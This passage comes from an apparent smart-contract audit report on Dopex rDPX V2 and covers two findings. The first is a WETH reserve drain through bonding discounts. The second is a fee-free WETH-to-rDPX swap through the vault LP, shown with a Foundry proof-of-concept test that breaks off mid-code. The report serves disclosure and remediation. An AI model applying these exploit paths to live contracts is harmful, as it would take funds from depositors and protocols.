13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a><a href=\"https://github.com/code-423n4/2023-08-dopex-findings/issues/2210\">[M-01] Bonding WETH discounts can drain WETH reserves of RdpxV2Core contract to zero</a></h2>\n<p><em>Submitted by <a href=\"https://github.com/code-423n4/2023-08-dopex-findings/issues/2210\">Toshii</a></em></p>\n<p><a href=\"https://github.com/code-423n4/2023-08-dopex/blob/main/contracts/core/RdpxV2Core.sol#L570\">https://github.com/code-423n4/2023-08-dopex/blob/main/contracts/core/RdpxV2Core.sol#L570</a> </p>\n<p><a href=\"https://github.com/code-423n4/2023-08-dopex/blob/main/contracts/core/RdpxV2Core.sol#L1175-L1177\">https://github.com/code-423n4/2023-08-dopex/blob/main/contracts/core/RdpxV2Core.sol#L1175-L1177</a></p>\n<p>Depending on the reserves of rDPX, bonding discounts are given both on the rDPX and WETH collateral requirements for minting dpxETH. The bonding discounts (for both rDPX and WETH portions) are provided as rDPX which is taken from the treasury. The issue with this is that the RdpxV2Core contract only functions properly when the full amount of WETH is provided (75% of the dpxETH value), because as per docs, 50% of the value of the dpxETH you are minting is required in WETH to add liquidity to the dpxETH-WETH pool.</p>\n<p>This discount in WETH collateral requirements can be as high as <code>2/3 * 75% = 50%</code> of the entire value of dpxETH. The logic in the RdpxV2Core essentially then steals this extra WETH from the current balance of the contract, which can eventually drain this entire contract of WETH, leaving only rDPX tokens, which is highly problematic in terms of economic security. This will also DOS all future attempts to mint dpxETH once the WETH reserves are depleted.</p>\n<h3 id=\"proof-of-concept-9\" style=\"position:relative;\"><a href=\"#proof-of-concept-9\" aria-label=\"proof of concept 9 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Proof of Concept</h3>\n<p>When a user bonds using rDPX directly they first call the <code>bond</code> function of the RdpxV2Core contract:</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"40\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">bond</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_amount</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">rdpxBondId</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_to</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">) </span><span class=\"mtk11\">public</span><span class=\"mtk1\"> </span><span class=\"mtk11\">returns</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">receiptTokenAmount</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk11\">_whenNotPaused</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk3\">// Validate amount</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk11\">_validate</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_amount</span><span class=\"mtk1\"> &gt; </span><span class=\"mtk7\">0</span><span class=\"mtk1\">, </span><span class=\"mtk7\">4</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk3\">// Compute the bond cost</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  (</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">rdpxRequired</span><span class=\"mtk1\">, </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">wethRequired</span><span class=\"mtk1\">) = </span><span class=\"mtk11\">calculateBondCost</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">_amount</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">rdpxBondId</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  );</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  ...</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk3\">// purchase options</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">premium</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">putOptionsRequired</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">premium</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">_purchaseOptions</span><span class=\"mtk1\">(</span><span class=\"mtk12\">rdpxRequired</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk11\">_transfer</span><span class=\"mtk1\">(</span><span class=\"mtk12\">rdpxRequired</span><span class=\"mtk1\">, </span><span class=\"mtk12\">wethRequired</span><span class=\"mtk1\"> - </span><span class=\"mtk12\">premium</span><span class=\"mtk1\">, </span><span class=\"mtk12\">_amount</span><span class=\"mtk1\">, </span><span class=\"mtk12\">rdpxBondId</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk3\">// Stake the ETH in the ReceiptToken contract</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk12\">receiptTokenAmount</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">_stake</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_to</span><span class=\"mtk1\">, </span><span class=\"mtk12\">_amount</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  ...</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">}</span></span></span></code></pre>\n<p>The amount of WETH required, <code>wethRequired</code>, is calculated by the <code>calculateBondCost</code> function with the main logic being the following (note: the cost of the premium for the purchased amount of rDPX PUT option coverage is also included in this amount, but i am not showing that code here):</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"41\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">wethRequired</span><span class=\"mtk1\"> =</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  ((</span><span class=\"mtk12\">ETH_RATIO_PERCENTAGE</span><span class=\"mtk1\"> - (</span><span class=\"mtk12\">bondDiscount</span><span class=\"mtk1\"> / </span><span class=\"mtk7\">2</span><span class=\"mtk1\">)) * </span><span class=\"mtk12\">_amount</span><span class=\"mtk1\">) /</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  (</span><span class=\"mtk12\">DEFAULT_PRECISION</span><span class=\"mtk1\"> * </span><span class=\"mtk7\">1e2</span><span class=\"mtk1\">);</span></span></span></code></pre>\n<p>As can be seen, there is a potential <code>bondDiscount</code>, which can be at most 100e8. Given that ETH<em>RATIO</em>PERCENTAGE is set to 75e8, the minimum amount of <code>wethRequired</code> would be 25% of the <code>_amount</code> of dpxETH being minted. The remainder, which in this case would be 50% of the value of the dpxETH, will be provided by the reserve. Note: if this math didn’t make sense, recall that 75% of the value of the minted dpxETH needs to be provided in ETH, and this discount can be as much as 2/3 of the ETH amount, meaning the minimum ETH requirement of the user will be 75% * 2/3 = 25%.</p>\n<p>The remainder of the ETH portion (<code>discountReceivedInWeth</code>) is then paid for by the reserve in the <code>_transfer</code> function, which is defined as follows:</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"42\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">_transfer</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_rdpxAmount</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_wethAmount</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_bondAmount</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_bondId</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">) </span><span class=\"mtk11\">internal</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">_bondId</span><span class=\"mtk1\"> != </span><span class=\"mtk7\">0</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    ...</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  } </span><span class=\"mtk15\">else</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    ...</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk3\">// calculate extra rdpx to withdraw to compensate for discount</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">rdpxAmountInWeth</span><span class=\"mtk1\"> = (</span><span class=\"mtk12\">_rdpxAmount</span><span class=\"mtk1\"> * </span><span class=\"mtk11\">getRdpxPrice</span><span class=\"mtk1\">()) / </span><span class=\"mtk7\">1e8</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">discountReceivedInWeth</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">_bondAmount</span><span class=\"mtk1\"> -</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk12\">_wethAmount</span><span class=\"mtk1\"> -</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk12\">rdpxAmountInWeth</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">extraRdpxToWithdraw</span><span class=\"mtk1\"> = (</span><span class=\"mtk12\">discountReceivedInWeth</span><span class=\"mtk1\"> * </span><span class=\"mtk7\">1e8</span><span class=\"mtk1\">) /</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk11\">getRdpxPrice</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk3\">// withdraw the rdpx</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk11\">IRdpxReserve</span><span class=\"mtk1\">(</span><span class=\"mtk12\">addresses</span><span class=\"mtk1\">.</span><span class=\"mtk12\">rdpxReserve</span><span class=\"mtk1\">).</span><span class=\"mtk11\">withdraw</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk12\">_rdpxAmount</span><span class=\"mtk1\"> + </span><span class=\"mtk12\">extraRdpxToWithdraw</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    );</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">reserveAsset</span><span class=\"mtk1\">[</span><span class=\"mtk12\">reservesIndex</span><span class=\"mtk1\">[</span><span class=\"mtk8\">&quot;RDPX&quot;</span><span class=\"mtk1\">]].</span><span class=\"mtk12\">tokenBalance</span><span class=\"mtk1\"> +=</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk12\">_rdpxAmount</span><span class=\"mtk1\"> +</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk12\">extraRdpxToWithdraw</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">}</span></span></span></code></pre>\n<p>As can be seen, the <code>discountReceivedInWeth</code>, which is an amount of ETH, will then be converted into an equivalent amount of rDPX (<code>extraRdpxToWithdraw</code>), and then this amount of rDPX is withdrawn to serve as the collateral for the minted rDPX.</p>\n<p>The issue with this is the following call to <code>_stake</code> within the flow of the <code>bond</code> function, which has the following line of code:</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"43\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">reserveAsset</span><span class=\"mtk1\">[</span><span class=\"mtk12\">reservesIndex</span><span class=\"mtk1\">[</span><span class=\"mtk8\">&quot;WETH&quot;</span><span class=\"mtk1\">]].</span><span class=\"mtk12\">tokenBalance</span><span class=\"mtk1\"> -= </span><span class=\"mtk12\">_amount</span><span class=\"mtk1\"> / </span><span class=\"mtk7\">2</span><span class=\"mtk1\">;</span></span></span></code></pre>\n<p>Essentially, irrespective of the actual amount of ETH which has been deposited by the user, for the specified <code>_amount</code> of dpxETH to mint, <code>_amount / 2</code> of ETH will be taken from the token reserves of the RdpxV2Core contract. This means that as more and more ETH discounts are given, this ETH amount will be drained to zero. At this point, future calls to <code>bond</code> will revert.</p>\n<h3 id=\"recommended-mitigation-steps-9\" style=\"position:relative;\"><a href=\"#recommended-mitigation-steps-9\" aria-label=\"recommended mitigation steps 9 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Recommended Mitigation Steps</h3>\n<p>The discount on the WETH portion during minting should be provided in WETH rather than in an equivalent amount of rDPX.</p>\n<p><strong><a href=\"https://github.com/code-423n4/2023-08-dopex-findings/issues/2210#issuecomment-1734323260\">psytama (Dopex) confirmed</a></strong></p>\n<hr>\n<h2 id=\"m-02-the-vault-allows-free-swaps-from-weth-to-rdpx\" style=\"position:relative;\"><a href=\"#m-02-the-vault-allows-free-swaps-from-weth-to-rdpx\" aria-label=\"m 02 the vault allows free swaps from weth to rdpx permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a><a href=\"https://github.com/code-423n4/2023-08-dopex-findings/issues/2130\">[M-02] The vault allows “free” swaps from WETH to RDPX</a></h2>\n<p><em>Submitted by <a href=\"https://github.com/code-423n4/2023-08-dopex-findings/issues/2130\">LokiThe5th</a>, also found by <a href=\"https://github.com/code-423n4/2023-08-dopex-findings/issues/1643\">Evo</a>, <a href=\"https://github.com/code-423n4/2023-08-dopex-findings/issues/626\">0xnev</a>, and <a href=\"https://github.com/code-423n4/2023-08-dopex-findings/issues/357\">volodya</a></em></p>\n<p><a href=\"https://github.com/code-423n4/2023-08-dopex/blob/eb4d4a201b3a75dd4bddc74a34e9c42c71d0d12f/contracts/perp-vault/PerpetualAtlanticVaultLP.sol#L145-L175\">https://github.com/code-423n4/2023-08-dopex/blob/eb4d4a201b3a75dd4bddc74a34e9c42c71d0d12f/contracts/perp-vault/PerpetualAtlanticVaultLP.sol#L145-L175</a> </p>\n<p><a href=\"https://github.com/code-423n4/2023-08-dopex/blob/eb4d4a201b3a75dd4bddc74a34e9c42c71d0d12f/contracts/perp-vault/PerpetualAtlanticVaultLP.sol#L118-L135\">https://github.com/code-423n4/2023-08-dopex/blob/eb4d4a201b3a75dd4bddc74a34e9c42c71d0d12f/contracts/perp-vault/PerpetualAtlanticVaultLP.sol#L118-L135</a> </p>\n<p><a href=\"https://github.com/code-423n4/2023-08-dopex/blob/eb4d4a201b3a75dd4bddc74a34e9c42c71d0d12f/contracts/perp-vault/PerpetualAtlanticVaultLP.sol#L227\">https://github.com/code-423n4/2023-08-dopex/blob/eb4d4a201b3a75dd4bddc74a34e9c42c71d0d12f/contracts/perp-vault/PerpetualAtlanticVaultLP.sol#L227</a></p>\n<p>The <code>PerpetualAtlanticVaultLP</code> allows users to <code>deposit()</code> <code>WETH</code> into the vault and receive shares in return. If a user calls <code>redeem</code> on the vault, they receive a proportional amount of <code>WETH</code> and <code>rdpx</code> in return for burning their shares.</p>\n<p>This can be used as a way to swap from <code>WETH</code> to <code>rdpx</code> without needing to pay swap fees to the V2 Permissioned AMM that is being introduced in V2. Swapping in this way may allow users to receive <code>rdpx</code> at a discount.</p>\n<p><code>PerpetualAtlanticVaultLP</code> mints shares to a depositor by taking into account the current price of <code>rdpx</code> and using it to calculate the total underlying asset value. The root cause of the issue is that when calculating the amount of <code>rdpx</code> to return on <code>redeem</code>, the calculation does not use the current price, but uses: <code>shares.mulDivDown(_rdpxCollateral, supply)</code>.</p>\n<p>The practical effect being that of a swap of in proportions determined by the initial deposit price. This means that the vault itself may experience arbitrage, as the amount of <code>rdpx</code> returned is determined by it’s proportion in the vault at that moment, not by it’s current market value.</p>\n<p>This has been evaluated to medium as the vault’s depositors lose this value and the AMM loses out on swap fees.</p>\n<h3 id=\"proof-of-concept-10\" style=\"position:relative;\"><a href=\"#proof-of-concept-10\" aria-label=\"proof of concept 10 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Proof of Concept</h3>\n<p>Assumptions:</p>\n<ul>\n<li>there is rdpx in the <code>PerpetualAtlanticVaultLP</code> (i.e. puts have been settled)</li>\n</ul>\n<p>The PoC should be copied into the <code>perp-vault/Integration.t.sol</code> file and then can be run with <code>forge test --match-test testPoCMedium1 -vvv</code></p>\n<p>The line where the PoC starts is clearly marked. The PoC shows how the amount of <code>rdpx</code> returned from <code>deposit</code> and the immediate <code>redeem</code> is not affected by changes to the price once a deposit has been made, but is affected by the amount of underlying <code>rdpx</code>.</p>\n<p>This means that doing this type of “swap” may present arbitrage opportunities at the expense of depositors.</p>\n<details>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"\" data-index=\"44\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\">  function testPoCMedium1() external {</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    // Setup starts here -----------------------------&gt;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    setApprovals(address(1));</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    setApprovals(address(2));</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    setApprovals(address(3));</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    mintWeth(5 ether, address(1));</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    mintWeth(5 ether, address(2));</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    mintWeth(25 ether, address(3));</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    mintWeth(1 ether, address(4));</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    /// The users deposit</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    deposit(5 ether, address(1));</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    deposit(5 ether, address(2));</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    deposit(25 ether, address(3));</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    // premium = 100 * 0.05 weth = 5 weth</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    uint256 tokenId = purchase(100 ether, address(this)); // 0.015 gwei * 100 ether / 0.1 gwei = 15 ether collateral activated</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    skip(86500); // expires epoch 1</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    vault.updateFunding();</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    vault.updateFundingPaymentPointer();</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    uint256[] memory strikes = new uint256[](1);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    strikes[0] = 0.015 gwei;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    uint256 fundingAccrued = vault.calculateFunding(strikes);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    uint256[] memory tokenIds = new uint256[](1);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    tokenIds[0] = tokenId;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    // The market moves against `rdpx` and the puts are now in the money</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    priceOracle.updateRdpxPrice(0.010 gwei);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    vm.startPrank(address(this), address(this));</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    (uint256 ethAmount, uint256 rdpxAmount) = vault.settle(tokenIds);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    vm.stopPrank();</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    /// ---------------- POC STARTS HERE -------------------------------------------------///</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    // The user intending to swap deposits 1 WETH into the `VaultLP`</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    vm.startPrank(address(4));</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    weth.approve(address(vaultLp), 1 ether);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    uint256 userShares = vaultLp.deposit(1 ether, address(4));</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    vm.stopPrank();</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    // For the POC we get a quote at the current price of 0.010 gwei of WETH per rdpx</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    console.log(&quot;Deposit swap from WETH to RDPX - Part 1&quot;);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    console.log(&quot;Current rdpxPriceInEth: &quot;, vault.getUnderlyingPrice());</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    console.log(&quot;User gets:&quot;);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    uint256 userBalance = vaultLp.balanceOf(address(4));</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    (uint256 wethUser, uint256 rdpxUser) = vaultLp.redeemPreview(userBalance);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    console.log(&quot;WETH: &quot;, wethUser);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    console.log(&quot;rdpx: &quot;, rdpxUser);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    console.log(&quot;&quot;);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    // For the POC we get another quote at the current price of 0.010 gwei of WETH per rdpx</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    console.log(&quot;Deposit swap from WETH to RDPX - Part 2&quot;);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    priceOracle.updateRdpxPrice(0.020 gwei);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    console.log(&quot;Current rdpxPriceInEth: &quot;, vault.getUnderlyingPrice());</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    console.log(&quot;User gets:&quot;);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    (uint256 wethUserPart2, uint256 